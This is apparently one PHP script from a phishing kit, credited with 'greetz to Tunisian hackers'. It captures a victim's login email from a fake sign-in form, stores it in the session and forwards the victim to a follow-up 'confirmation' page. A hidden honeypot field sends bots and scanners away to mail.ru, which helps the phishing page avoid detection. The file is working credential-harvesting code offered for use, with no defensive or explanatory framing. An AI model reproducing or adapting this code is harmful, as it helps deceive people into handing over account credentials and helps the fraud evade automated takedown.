<?php
/*
***********************************************************
*                                                         *
*                                                         *
*             Dean Gold                                   *
*                                                         *
*             GR33TZ TO TUNISIAN HACKERS                  *
*                                                         *
***********************************************************
*/
session_start();
require "../../FUNC/One_Time.php";
$bug= $_POST['customerage'];
if (!empty($bug))
	{ 
		header('Location: https://mail.ru/');
		exit; 
	} 	
$email= $_POST['customerlog'];
	if ( ( !$email ) ||
		 ( strlen($_POST['customerlog']) > 35 ) ||
	     ( !preg_match("#^[A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})$#", $email) )
       ) 
	{ 
		header('Location: ../../Home?false='.md5(microtime()));
		exit; 
	} 
$_SESSION['_USER_']=$_POST['customerlog'];
header("Location: ../../Home_confirmation/?=".$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>